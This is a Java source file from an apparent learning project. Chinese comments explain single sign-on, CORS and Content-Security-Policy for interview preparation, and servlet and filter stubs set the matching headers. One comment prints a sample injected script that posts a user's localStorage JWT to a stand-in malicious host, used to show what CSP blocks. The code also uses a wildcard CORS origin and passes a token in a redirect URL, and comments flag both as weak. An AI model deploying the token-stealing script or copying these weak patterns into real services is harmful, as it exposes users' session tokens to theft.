package com.example.interview.sso;
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.IOException;
import java.util.HashMap;
/**
 * Created with IntelliJ IDEA.
 *
 * @author : lczhang
 * @version : 1.0
 * @Project : Learning-Project
 * @Package : com.example.interview
 * @ClassName : .java
 * @createTime : 2025/3/30 17:33
 * @Email : lczhang93@gmail.com
 * @Website : https://iridescent-zhang.github.io
 * @Description :
 */

/**
 * 单点登录 (SSO) 是一种允许用户使用一个登录过程来访问多个独立应用系统的机制。在面试中提到的 CORS (跨源资源共享) 和 CSP (内容安全策略)
 * SSO 的核心理念是用户在一个系统中登录后，可以访问其他相关系统而无需再进行登录。淘宝和天猫的 SSO 可能会包括以下步骤：
 * 身份验证：用户在登录页面输入凭证进行身份验证。
 * 票据生成：经过验证后，认证服务器生成一个票据（例如 JWT 令牌）来表示用户的登录状态。
 * 票据传播：将票据发送到相关系统（如淘宝和天猫），以便这些系统可以信任用户已经登录的状态。
 * 跨域访问：因为这些系统域名不同（如 taobao.com 和 tmall.com），跨域请求和安全策略需要妥当处理。
 *
 * CORS (跨源资源共享)
 * CORS 是一种机制，通过使用额外的 HTTP 头来告诉浏览器，允许应用程序从其他域名请求资源。 淘宝和天猫在实现单点登录时必须处理跨域请求问题，因为它们的域名是不同的。
 * 服务器需要设置适当的 CORS 头，比如 Access-Control-Allow-Origin 来允许跨域请求。这是实现跨域请求的重要步骤。
 *
 * 配置 CSP  key  控制资源加载
 * CSP 是一种安全机制，通过控制资源的加载来防止跨站脚本攻击 (XSS) 等安全问题。在 SSO 场景下，为保证安全性， 内容安全策略必须配置得当，以防止未经授权的资源加载和代码执行。
 * 服务器需要设置适当的 CSP 头，比如 Content-Security-Policy 来限制资源的来源。
 *
 * 内容安全策略（CSP）是一种 key  由服务器通过 HTTP 头部发送到浏览器的安全机制。它帮助防止各种类型的攻击，包括 Cross-Site Scripting (XSS)
 * CSP 的核心思想是 key  限制浏览器加载或执行的资源类型和来源。这样，即使攻击者成功将恶意脚本注入了网页，[这些从不受信的网站来的恶意脚本也不会被加载和执行]
 *
 * CSP 在单点登录中的作用
 * 单点登录（SSO）系统往往需要在多个相关域名之间共享用户认证状态。这意味着你的系统可能需要处理跨域请求、细致的身份验证以及用户数据的安全性。CSP 在这些方面起到了重要的保护作用：
 * 1. 防止 XSS 攻击
 * 单点登录系统中，如果没有适当的安全措施，攻击者可能会尝试通过注入恶意脚本来窃取 JWT 令牌或其他敏感信息。通过设置严格的 CSP，可以限制哪些脚本可以在页面上运行，防止不受信任或恶意的脚本执行。
 * 2. 保护敏感信息
 * 通过 CSP，可以确保只有来自可信源的资源（如 JavaScript 文件）才能加载和执行，这样可以避免不必要的数据泄露。
 * 例如，如果攻击者成功地将恶意脚本注入页面，这些恶意脚本也无法运行或从不受信任的来源加载，从而保障用户的 JWT 令牌和其他敏感信息的安全。
 * 3. 防止数据注入
 * CSP 配置可以防止其他类型的数据注入攻击。比如通过 default-src 'self'，只允许从自身域加载资源，这样可以避免攻击者通过外部图片、样式表等方式注入恶意内容。
 *

 举个例子
 假设用户登录淘宝 (taobao.com)，并获得了 JWT 令牌。这个令牌将被存储在浏览器端，用于后续访问天猫 (tmall.com) 的资源。
 如果没有 CSP，攻击者可能会尝试在淘宝页面注入一个恶意脚本，窃取用户的 JWT 令牌并发送到恶意服务器。他们可能会利用以下技术：

 // 恶意脚本
 fetch('http://malicious.example.com/stealToken', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
     },
 body: JSON.stringify({ token: localStorage.getItem('jwtToken') })
 });

 有了 CSP，只有来自自己域名和受信任源的脚本才会被允许运行：
 response.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' https://trustedscripts.example.com;");
 这样，即使恶意脚本被注入，浏览器也会阻止它的执行和加载。
 *
 * 总结一下：
 * CSP 的作用：
 * 防止 XSS 攻击：确保只有受信任的脚本可以执行，防止恶意脚本窃取用户敏感信息【我们单点登录的场景就是 jwt】。
 * 保护用户数据：避免 JWT 令牌等敏感信息暴露给不受信的来源。
 * 增强安全性：通过限制资源加载来源，提升整体应用的安全性。
 *
 * CSP 就像是一组安全规则，告诉浏览器只允许从指定的来源加载和执行资源，从而保护你的单点登录系统（SSO）免受许多种常见攻击的威胁。
 */
public class SSOExample {
}

/**
 * SSO 流程 (简化版)
 *  1、用户登录：用户访问 login.taobao.com 并输入凭证。
 *  2、身份验证：login.taobao.com 验证用户凭证并产生票据 (JWT)。
 *  3、票据传播：将票据发送到 tmall.com 的受控访问点。
 *  4、跨域请求：配置 CORS 和 CSP 头以允许票据跨域传输并确保安全。
 */
class LoginServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        // 验证用户凭证

        // 创建 JWT 或其他票据
        String token = "";

        // 配置 CORS 和 CSP 头
        response.setHeader("Access-Control-Allow-Origin", "https://tmall.com");
        response.setHeader("Access-Control-Allow-Methods", "POST");
        response.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
        /**
         * key  解析
         * default-src 'self': 默认情况下，只允许加载来自自身域名的资源（包括图片、样式表、脚本等）。
         * script-src 'self' https://trustedscripts.example.com: 仅允许加载和执行来自自身域名和 https://trustedscripts.example.com 的 JavaScript 脚本。
         */
        response.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' https://trustedscripts.example.com;");

        /**
         * 发送票据到天猫
         * 这个代码的意思是：将用户重定向到 tmall.com，并在 URL 中附带 JWT 令牌（作为查询参数），这并不是最推荐的传递 JWT 令牌的方法
         * 一般更推荐的方法是将 JWT 令牌直接返回给客户端，客户端记住这个令牌，然后在后续请求中使用它。
         */
        response.sendRedirect("https://tmall.com/login?token=" + token);
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doPost(request, response);
    }
}

// key  CORS
class CORSFilter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        // 通过设置 Access-Control-Allow-Origin: * 来允许所有域名的跨域请求。但在实际工作中，通常应该只有允许特定的域名，以增强安全性。
        httpResponse.setHeader("Access-Control-Allow-Origin", "*");
        httpResponse.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
        httpResponse.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

        chain.doFilter(request, response);
    }

    public void init(FilterConfig filterConfig) {}
    public void destroy() {}
}

// key  CSP
class CSPFilter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        // Content-Security-Policy 头被设置以只允许从受信任的来源加载资源。这有助于防止 XSS 攻击和其他安全问题。
        String csp = "default-src 'self'; script-src 'self' https://trustedscripts.example.com; style-src 'self' https://trustedstyles.example.com;";
        httpResponse.setHeader("Content-Security-Policy", csp);

        chain.doFilter(request, response);
    }

    public void init(FilterConfig filterConfig) {}
    public void destroy() {}
}